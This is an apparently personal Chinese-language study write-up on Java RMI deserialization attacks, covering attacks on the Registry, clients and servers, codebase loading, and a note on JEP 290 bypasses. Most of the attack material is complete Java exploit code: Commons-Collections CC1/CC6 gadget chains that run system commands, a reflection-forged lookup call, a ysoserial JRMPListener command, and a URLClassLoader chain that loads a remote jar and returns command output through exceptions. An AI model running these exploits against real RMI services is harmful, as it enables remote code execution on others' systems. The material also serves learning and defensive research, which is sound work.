
# RMI所引发的安全问题

我们思考：
1.如果我们能访问注册表，如何对其攻击?


2.如果我们控制了目标RMI客户端中Naming.lookup的参数URL，我们能不能进行攻击？

## 攻击RMI Registry

书接上文我们与远端服务器交互有以下几种方式

```java
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
    if (var4 != 4905912898345647071L) {
        throw new SkeletonMismatchException("interface hash mismatch");
    } else {
        RegistryImpl var6 = (RegistryImpl)var1;
        String var7;
        Remote var8;
        ObjectInput var10;
        ObjectInput var11;
        switch (var3) {
            case 0:
                try {
                    var11 = var2.getInputStream();
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var94) {
                    throw new UnmarshalException("error unmarshalling arguments", var94);
                } catch (ClassNotFoundException var95) {
                    throw new UnmarshalException("error unmarshalling arguments", var95);
                } finally {
                    var2.releaseInputStream();
                }

                var6.bind(var7, var8);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var93) {
                    throw new MarshalException("error marshalling return", var93);
                }
            case 1:
                var2.releaseInputStream();
                String[] var97 = var6.list();

                try {
                    ObjectOutput var98 = var2.getResultStream(true);
                    var98.writeObject(var97);
                    break;
                } catch (IOException var92) {
                    throw new MarshalException("error marshalling return", var92);
                }
            case 2:
                try {
                    var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var89) {
                    throw new UnmarshalException("error unmarshalling arguments", var89);
                } catch (ClassNotFoundException var90) {
                    throw new UnmarshalException("error unmarshalling arguments", var90);
                } finally {
                    var2.releaseInputStream();
                }

                var8 = var6.lookup(var7);

                try {
                    ObjectOutput var9 = var2.getResultStream(true);
                    var9.writeObject(var8);
                    break;
                } catch (IOException var88) {
                    throw new MarshalException("error marshalling return", var88);
                }
            case 3:
                try {
                    var11 = var2.getInputStream();
                    var7 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var85) {
                    throw new UnmarshalException("error unmarshalling arguments", var85);
                } catch (ClassNotFoundException var86) {
                    throw new UnmarshalException("error unmarshalling arguments", var86);
                } finally {
                    var2.releaseInputStream();
                }

                var6.rebind(var7, var8);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var84) {
                    throw new MarshalException("error marshalling return", var84);
                }
            case 4:
                try {
                    var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var81) {
                    throw new UnmarshalException("error unmarshalling arguments", var81);
                } catch (ClassNotFoundException var82) {
                    throw new UnmarshalException("error unmarshalling arguments", var82);
                } finally {
                    var2.releaseInputStream();
                }

                var6.unbind(var7);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var80) {
                    throw new MarshalException("error marshalling return", var80);
                }
            default:
                throw new UnmarshalException("invalid method number");
        }

    }
}
```
witch 中每一个 case 分别对应不同的操作, 关系如下

- 0: bind
- 1: list
- 2: lookup
- 3: rebind
- 4: unbind

首先，RMI Registry是一个远程对象管理的地方，可以理解为一个远程对象的“后台”。我们可以尝试直 接访问“后台”功能，比如修改远程服务器上Hello对应的对象

```java
RemoteHelloWorld h = new RemoteHelloWorld(); Naming.rebind("rmi://192.168.135.142:1099/Hello", h);
```
但是有的时候这样是不行的，会报错。
在远程调用的时候
我们无法使用rebind、 bind、unbind（重新绑定、绑定、解绑定）等方法。

不过list（列表） 和lookup （查找）方法可以远程调用
list可以列出目标上所有绑定的对象

```java
String[] s = Naming.list("rmi://192.168.135.142:1099");
```
lookup的作用就是获得某个远程对象。

那么如果远程服务器上有一个危险的目标方法，我们就可以通过RMI对其进行调用
###  bind & rebind攻击
bind 和 rebind 过程中 Registry 会执行 readObject, 进行反序列化的参数是参数名以及远程对象，存在反序列化漏洞
![[Pasted image 20251219110754.png]]![[Pasted image 20251219110813.png]]


下面以 cc6 为例构造 Client 端的 payload
```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.Serializable;
import java.lang.reflect.*;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;


public class Client {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        Registry registry = LocateRegistry.getRegistry("192.168.100.1", 1099);
        registry.bind("test", new Wrapper(expMap));
    }
}

class Wrapper implements Remote, Serializable {
    private Object obj;

    public Wrapper(Object obj) {
        this.obj = obj;
    }
}
```
注意
bind的第二个参数必须是Remote类型
expMap 本身不继承自 Remote 接口, 需要自己写一个包装类,使其可以序列化
但是这里有一个问题，我们注册表那端也得有一个`Wrapper()`呀！这个exp没法利用

这里我们就想到了可以使用动！态！代！理！
我们可以强制生成一个动态代理，让他继承Remote接口
```java
package com.example.demo.RMI;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.rmi.Remote;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import java.util.HashMap;  
import java.util.Map;  
public class RegistryBindAttack {  
    public static void main(String[] args) throws Exception{  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  
        InvocationHandler handler = (InvocationHandler) CC1();  
        Remote remote = (Remote) Proxy.newProxyInstance(  
                Remote.class.getClassLoader(),new Class[] { Remote.class }, handler);  
        registry.bind("test",remote);  
    }  
  
  
  
    public static Object CC1() throws Exception{  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  
                new InvokerTransformer("getMethod",  
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke"  
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("value","drunkbaby");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
        aihConstructor.setAccessible(true);  
        Object o = aihConstructor.newInstance(Target.class, transformedMap);  
        return o;  
    }  
}
```
解释一下main函数中干了什么
首先拿到了一个注册表对象
其次new了一个我们的攻击对象
后使用动态代理（第一个参数是要调用的类加载器，第二个参数是接口数组，第三个参数是要调用的处理器），生成一个Remote的动态代理对象，用来欺骗bind()的第二个参数

### list()方法

用 `list()` 方法可以列出目标上所有绑定的对象：

在 RMIClient 文件夹里面新建一个新的 Java class，因为我们后续的攻击肯定是从用户的客户端出发，往服务端这里打的。代码如下
```java
package RMI;  
 
import java.rmi.Naming;  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.server.UnicastRemoteObject;  
public class RMIServer {  
    public interface IRemoteHelloWorld extends Remote {  
        public String hello() throws RemoteException;  
    }  
  
    public class RemoteHelloWorld extends UnicastRemoteObject implements  
            IRemoteHelloWorld {  
        protected RemoteHelloWorld() throws RemoteException {  
            super();  
        }   
        public String hello() throws RemoteException {  
            System.out.println("call from");  
            return "Hello world";  
        }  
    }  
    private void start() throws Exception {  
        RemoteHelloWorld h = new RemoteHelloWorld();  
        LocateRegistry.createRegistry(1099);  
        Naming.rebind("rmi://127.0.0.1:1099/Hello", h);  
    }  
    public static void main(String[] args) throws Exception {  
        RMIServer rmiServer = new RMIServer();  
        rmiServer.start();  
  
        String[] s = Naming.list("rmi://127.0.0.1:1099");  
        System.out.println("直接输出会输出一个对象的类型签名和哈希码的十六进制："+s);  
        System.out.println("---------------------------");  
  
        for (String name : s) {  
            System.out.println("数组遍历后会输出真正的内容：" + name);  
        }  
    }  
}
```


![[Pasted image 20251218183912.png]]
因为这里没有 `readObject()`，所以无法进行反序列化，这样我们的攻击面就太窄了。我们可以跳进 `RegistryImpl_Skel#dispatch` 看一下，list 对应的是 case1![[Pasted image 20251218184330.png]]
没有readObject()所以不好攻击。

###  unbind & lookup 的攻击
首先我们看看这个特点是什么，我们只可以传入 `String`类型的
![[Pasted image 20251219110901.png]]![[Pasted image 20251219110922.png]]

那我们还是和之前一样，通过传入一个 `String`类型的对象，触发反序列化
我们可以通过反射来实现伪造lookup连接请求，修改lookup方法代码使其传入对象。

```java
package com.example.demo.RMI;  
  
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
  
import java.io.ObjectOutput;  
import java.lang.reflect.Field;  
import java.rmi.server.RemoteObject;  
import java.util.HashMap;  
import java.util.Map;  
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
import java.rmi.Remote;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
import sun.rmi.server.UnicastRef;  
import java.rmi.server.Operation;  
import java.rmi.server.RemoteCall;  
  
  
public class RegistryLookupAttack {  
    public static void main(String[] args) throws Exception{  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  
        InvocationHandler handler = (InvocationHandler) CC1();  
        Remote remote = Remote.class.cast(Proxy.newProxyInstance(  
                Remote.class.getClassLoader(),new Class[] { Remote.class }, handler));  
  
        Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();  
        fields_0[0].setAccessible(true);  
        UnicastRef ref = (UnicastRef) fields_0[0].get(registry);  
  
        //获取operations  
  
        Field[] fields_1 = registry.getClass().getDeclaredFields();  
        fields_1[0].setAccessible(true);  
        Operation[] operations = (Operation[]) fields_1[0].get(registry);  
  
        // 伪造lookup的代码，去伪造传输信息  
        RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);  
        ObjectOutput var3 = var2.getOutputStream();  
        var3.writeObject(remote);  
        ref.invoke(var2);  
    }  
    public static Object CC1() throws Exception{  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class), // 构造 setValue 的可控参数  
                new InvokerTransformer("getMethod",  
                        new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),  
                new InvokerTransformer("invoke"  
                        , new Class[]{Object.class, Object[].class}, new Object[]{null, null}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})  
        };  
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);  
        HashMap<Object, Object> hashMap = new HashMap<>();  
        hashMap.put("value","drunkbaby");  
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer);  
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");  
        Constructor aihConstructor = c.getDeclaredConstructor(Class.class, Map.class);  
        aihConstructor.setAccessible(true);  
        Object o = aihConstructor.newInstance(Target.class, transformedMap);  
        return o;  
    }  
}
```
下面解释一下，因为这个有点底层了

这里通过反射来从 `RegistryImpl_Stub`对象中强行取出底层的通信组件 `UnicastRef`和操作集`Operation[]`
```java
//获取RemoteObject中的ref这个属性
Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields();  
fields_0[0].setAccessible(true);  
UnicastRef ref = (UnicastRef) fields_0[0].get(registry);
//获取`Operation[]`
Field[] fields_1 = registry.getClass().getDeclaredFields();  
fields_1[0].setAccessible(true);  
Operation[] operations = (Operation[]) fields_1[0].get(registry);
```
下面伪造了操作指令， `ref.newCall(..., 2, 4905912898345647071L)`中的2代表lookup操作

`var3.writeObject(remote)`这一步正常服务端执行lookup的`dispatch` 逻辑时期望从中读取一个 `String`类型的name参数
实际上，我们利用`ObjectOutput`直接将包装了 CC1 链的代理对象（`remote`）写进了流里
当服务端调用 `readObject()` 准备获取那个“字符串名字”时，它并不预先检查字节流里到底是什么。
这样我们恶意的handler就被塞进去了
```java
RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L);  
ObjectOutput var3 = var2.getOutputStream();  
var3.writeObject(remote);  
ref.invoke(var2);
```

## 攻击Client
### 通过 Registry 攻击 (JRMPListener)
**原理是当 Client 调用 Registry 的 lookup / list 方法时, RegistryImpl_Skel 会进行 writeObject, 那么在 Client 端一定会出现 readObject, 从而造成反序列化漏洞**
也就是我们之前说的，注册表向客户端传输对象的信息的时候，一定也会有序列化和反序列化的流程，那么就会产生攻击点
还是经典的几个方法`bind  unbind rebind list lookup`
其中除了`unbind`和`rebind`都会返回数据给客户端，返回的数据是序列化形式，那么到了客户端就会进行反序列化，如果我们能控制注册中心的返回数据，那么就能实现对客户端的攻击

![[Pasted image 20251209211728.png]]

ysoserial 提供了 JRMPListener 这个 **exploit** 来攻击 Client (当然也可以 rasp hook 或手工伪造 Registry response)

利用方式如下
`java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 "calc.exe"`
然后通过客户端去访问
```java
import java.rmi.Naming;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
   
public class Client {  
    public static void main(String[] args) throws RemoteException {  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);  
        registry.list();  
    }  
}
```
![[Pasted image 20251220133426.png]]
## 通过server攻击client

有两种情况
一种是利用 codebase 远程加载对象,
另一种是远程接口中存在返回值为 Object 的方法(我们在RMI机制中提到过)

### RMI利用codebase加载远程对象
我觉得，这种通过服务端攻击客户端的场景过于鸡肋，实战很难打出来。。
但看到各位师傅都写了，那也学习一下
####  什么是codebase
RMI中也存在远程加载的场景，也会涉及到codebase。
codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径
如果服务端向客户端发送了一个它从未见过的对象，客户端就会报一个类找不到的异常
这时候我们就可以利用codebase，codebase通常是远程URL，比如http、ftp等。 如
当对象被序列化传输时，发送方可以在序列化流中贴一个“标签”，告诉接收方：“如果你本地没有这个类，可以去 `http://attack-server.com/classes/` 这里下载”。接收方看到标签后，会启动类加载器去该地址抓取字节码并加载到内存中。
果我们指定 `codebase=http://example.com/ `，然后加载` org.vulhub.example.Example `类，则 Java虚拟机会下载这个文件` http://example.com/org/vulhub/example/Example.class `，并作为 Example类的字节码。

RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻 找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在 本地没有找到这个类，就会去远程加载codebase中的类。 这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？

对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去 CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。 不过显然官方也注意到了这一个安全隐患，所以只有满足如下条件的RMI服务器才能被攻击:

- 安装并配置了SecurityManager  并且配置`java.security.policy` Java版本低于7u21、6u45
- 或者设置了 java.rmi.server.useCodebaseOnly=false

其中 java.rmi.server.useCodebaseOnly 是在Java 7u21、6u45的时候修改的一个默认设置：
官方将其默认值由false改为true
在其为true的前提下，java虚拟机将只信任预先配置好的codebase，不再支持从RMI请求中获取
#### 攻击
我们来 简单编写一个RMIServer用于复现这个漏洞。
建立四个文件：
```java
    // ICalc.java  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
import java.util.List;  
    public interface ICalc extends Remote {  
        public Integer sum(List<Integer> params) throws RemoteException;  
    }  
// Calc.java  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
import java.util.List;  
import java.rmi.server.UnicastRemoteObject;  
    public class Calc extends UnicastRemoteObject implements ICalc {  
        public Calc() throws RemoteException {}  
        public Integer sum(List<Integer> params) throws RemoteException {  
            Integer sum = 0;  
            for (Integer param : params) {  
                sum += param;  
            }  
            return sum;  
        }  
    }  
// RemoteRMIServer.java  
import java.rmi.Naming;  
import java.rmi.Remote;  
import java.rmi.RemoteException;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.server.UnicastRemoteObject;  
import java.util.List;  
    public class RemoteRMIServer {  
        private void start() throws Exception {  
            if (System.getSecurityManager() == null) {  
                System.out.println("setup SecurityManager");  
                System.setSecurityManager(new SecurityManager());  
            }  
            Calc h = new Calc();  
            LocateRegistry.createRegistry(1099);  
            Naming.rebind("refObj", h);  
        }  
        public static void main(String[] args) throws Exception {  
            new RemoteRMIServer().start();  
        }  
    }  
    // client.policy  
    grant {  
        permission java.security.AllPermission;  
    }
```
编译并运行：
```bash
javac *.java 
java -Djava.rmi.server.hostname=192.168.135.142 Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer
```
其中，`java.rmi.server.hostname`是服务器的IP地址，远程调用时需要根据这个值来访问RMI Server



然后，我们再建立一个RMIClient.java：
```java
import java.rmi.Naming;  
import java.util.List;  
import java.util.ArrayList;  
import java.io.Serializable;  
public class RMIClient implements Serializable {  
    public class Payload extends ArrayList<Integer> {}  
    public void lookup() throws Exception {  
        ICalc r = (ICalc)  
                Naming.lookup("rmi://192.168.135.142:1099/refObj");  
        List<Integer> li = new Payload();  
        li.add(3);  
        li.add(4);  
        System.out.println(r.sum(li));  
    }  
    public static void main(String[] args) throws Exception {  
        new RMIClient().lookup();  
    }  
}
```

这个Client我们需要在另一个位置运行，因为我们需要让RMI Server在本地CLASSPATH里找不到类，才 会去加载codebase中的类，所以不能将RMIClient.java放在RMI Server所在的目录中。 运行RMIClient：
```bash
java -Djava.rmi.server.useCodebaseOnly=false Djava.rmi.server.codebase=http://example.com/ RMIClient
```
此时会抛出一个magic value不正确的错误：

查看example.com的日志，可见收到了来自Java的请求 /RMIClient$Payload.class 。因为我们还没 有实际放置这个类文件，所以上面出现了异常：


我们只需要编译一个恶意类，将其class文件放置在Web服务器的 /RMIClient$Payload.class 即可。

可用性不强，我们直接粘的P神的内容。
### 远程接口中存在返回值为 Object 的方法
如图，在我们分析RMI机制的时候就产生了这样的思考，如果任意一个方法接受的参数是一个对象，那么在通信过程中一定对象是需要序列化和反序列化的，那么就会产生攻击面
![[Pasted image 20251220140215.png]]
所以我们需要伪造一个服务端，当客户端调用某个远程方法时，返回的参数是我们构造好的恶意对象。这里以CC1为例：
server👇
```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;
import java.util.HashMap;
import java.util.Map;


public class Server {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Hello helloImpl = new HelloImpl();
        registry.bind("hello", helloImpl);
    }
}

interface Hello extends Remote{
    public Object world() throws RemoteException, NoSuchFieldException, IllegalAccessException;
}

class HelloImpl extends UnicastRemoteObject implements Hello{

    protected HelloImpl() throws RemoteException {
        super();
    }

    @Override
    public Object world() throws RemoteException, NoSuchFieldException, IllegalAccessException {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        return expMap;

    }
}
```
编写 Client (需要调用指定方法)
```java
package com.example.demo.RMI.ClientAttack;  
  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
  
  
public class Client {  
    public static void main(String[] args) throws Exception{  
  
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);  
        Hello hello = (Hello) registry.lookup("hello");  
        hello.world();  
    }  
}
```

## 攻击server


与 Server 攻击 Client 一样, 被调用的接口方法中需要存在 Object 类型的参数, 这样 Server 端会对传输过来的数据进行反序列化
- jdk版本1.7
- 使用具有漏洞的Commons-Collections3.1组件

编写 Client

```java
package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Field;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;
import java.util.Map;


public class Client {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getDeclaredMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
                new ConstantTransformer(1)
        };

        Transformer transformerChain = new ChainedTransformer(new Transformer[]{new ConstantTransformer(1)});

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);

        TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");

        Map expMap = new HashMap();
        expMap.put(tme, "valuevalue");
        outerMap.remove("keykey");

        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, transformers);

        Registry registry = LocateRegistry.getRegistry("192.168.100.1", 1099);
        Hello hello = (Hello) registry.lookup("hello");
        hello.world(expMap);
    }
}

interface Hello extends Remote{
    public void world(Object obj) throws RemoteException;
}
```

编写 Server
```java
package org.example;

import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.rmi.server.UnicastRemoteObject;

public class Server {
    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Hello helloImpl = new HelloImpl();
        registry.bind("hello", helloImpl);
    }
}

interface Hello extends Remote{
    public void world(Object obj) throws RemoteException;
}

class HelloImpl extends UnicastRemoteObject implements Hello{

    protected HelloImpl() throws RemoteException {
        super();
    }

    @Override
    public void world(Object obj) throws RemoteException{
        System.out.println(obj.toString());

    }
}
```
依旧鸡肋这一块哈。。
#### 远程加载对象

和上边Server打Client一样利用条件非常苛刻。

参考：[https://paper.seebug.org/1091/#serverrmi](https://paper.seebug.org/1091/#serverrmi)

# 进阶攻击方式

##  利用 URLClassLoader实现回显攻击
我们真实环境中会遇到各种各样的问题，那我们就会想到会不会有办法能解决无回显的问题

在RMI通信的过程中，如果服务端在处理请求的时候发生了异常，服务端的 `RegistryImpl_Skel` 会捕获这个异常，并将其**序列化**后发送回客户端。
如果我们能让命令执行的结果变成异常信息的一部分，那么服务端抛出异常时，就会自动把命令结果送回我们的手中。

这里我们利用URLClassLoader加载远程jar，传入服务端，反序列化后调用其方法，在方法内抛出错误，错误会传回客户端

首先我们写一个demo，打成jar包
```java
import java.io.BufferedReader;  
import java.io.InputStreamReader;  
   
public class ErrorBaseExec {  
   
    public static void do_exec(String args) throws Exception  
    {  
        Process proc = Runtime.getRuntime().exec(args);  
        BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));  
        StringBuffer sb = new StringBuffer();  
        String line;  
        while ((line = br.readLine()) != null)  
        {  
            sb.append(line).append("\n");  
        }  
        String result = sb.toString();  
        Exception e=new Exception(result);  
        throw e;  
    }  
}

```

通过如下命令制作成jar包：
```java
javac ErrorBaseExec.java  
jar -cvf RMIexploit.jar ErrorBaseExec.class
```
我们先来分析一下这个demo做了什么，首先执行命令
利用 `BufferedReader`读取进程的 `InputStreamReader.getInputStream()`获得执行命令后的结果
将读取到的结果对象 `sb`进行`toString()`存入一个异常对象抛出，然后我们就能看到回显了，确实巧妙

客户端poc
```java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.map.TransformedMap;  
   
import java.lang.annotation.Target;  
import java.lang.reflect.Constructor;  
import java.lang.reflect.InvocationHandler;  
import java.lang.reflect.Proxy;  
   
import java.net.URLClassLoader;  
   
import java.rmi.Remote;  
import java.rmi.registry.LocateRegistry;  
import java.rmi.registry.Registry;  
   
import java.util.HashMap;  
import java.util.Map;  
   
   
public class Client {  
    public static Constructor<?> getFirstCtor(final String name)  
            throws Exception {  
        final Constructor<?> ctor = Class.forName(name).getDeclaredConstructors()[0];  
        ctor.setAccessible(true);  
   
        return ctor;  
    }  
   
    public static void main(String[] args) throws Exception {  
        String ip = "127.0.0.1"; //注册中心ip  
        int port = 1099; //注册中心端口  
        String remotejar = 远程jar;  
        String command = "whoami";  
        final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";  
   
        try {  
            final Transformer[] transformers = new Transformer[] {  
                    new ConstantTransformer(java.net.URLClassLoader.class),  
                    new InvokerTransformer("getConstructor",  
                            new Class[] { Class[].class },  
                            new Object[] { new Class[] { java.net.URL[].class } }),  
                    new InvokerTransformer("newInstance",  
                            new Class[] { Object[].class },  
                            new Object[] {  
                                    new Object[] {  
                                            new java.net.URL[] { new java.net.URL(remotejar) }  
                                    }  
                            }),  
                    new InvokerTransformer("loadClass",  
                            new Class[] { String.class },  
                            new Object[] { "ErrorBaseExec" }),  
                    new InvokerTransformer("getMethod",  
                            new Class[] { String.class, Class[].class },  
                            new Object[] { "do_exec", new Class[] { String.class } }),  
                    new InvokerTransformer("invoke",  
                            new Class[] { Object.class, Object[].class },  
                            new Object[] { null, new String[] { command } })  
            };  
            Transformer transformedChain = new ChainedTransformer(transformers);  
            Map innerMap = new HashMap();  
            innerMap.put("value", "value");  
   
            Map outerMap = TransformedMap.decorate(innerMap, null,  
                    transformedChain);  
            Class cl = Class.forName(  
                    "sun.reflect.annotation.AnnotationInvocationHandler");  
            Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);  
            ctor.setAccessible(true);  
   
            Object instance = ctor.newInstance(Target.class, outerMap);  
            Registry registry = LocateRegistry.getRegistry(ip, port);  
            InvocationHandler h = (InvocationHandler) getFirstCtor(ANN_INV_HANDLER_CLASS)  
                    .newInstance(Target.class,  
                            outerMap);  
            Remote r = Remote.class.cast(Proxy.newProxyInstance(  
                    Remote.class.getClassLoader(),  
                    new Class[] { Remote.class }, h));  
            registry.bind("liming", r);  
        } catch (Exception e) {  
            try {  
                System.out.print(e.getCause().getCause().getCause().getMessage());  
            } catch (Exception ee) {  
                throw e;  
            }  
        }  
    }  
}
```
客户端中，由于异常在传递到客户端被RMI层层包装，通过一层一层进入拿到我自定义的exception
最终通过getMessage()打印出来


### 绕过 JEP 290
高版本 jdk 引入了 JEP 290 策略, 并在 Client 与 Registry 的通信过程中默认设置了 registryFilter, 使得只有在白名单里面的类才能够被反序列化

绕过 JEP 290 有很多种方法, 仔细研究的话又是一个深坑…

这里就先放几篇参考文章
开新文章再写！

[https://paper.seebug.org/1251/#jep-290-jep290](https://paper.seebug.org/1251/#jep-290-jep290)

[https://paper.seebug.org/1194/#jep290](https://paper.seebug.org/1194/#jep290)

[https://xz.aliyun.com/t/7932](https://xz.aliyun.com/t/7932)

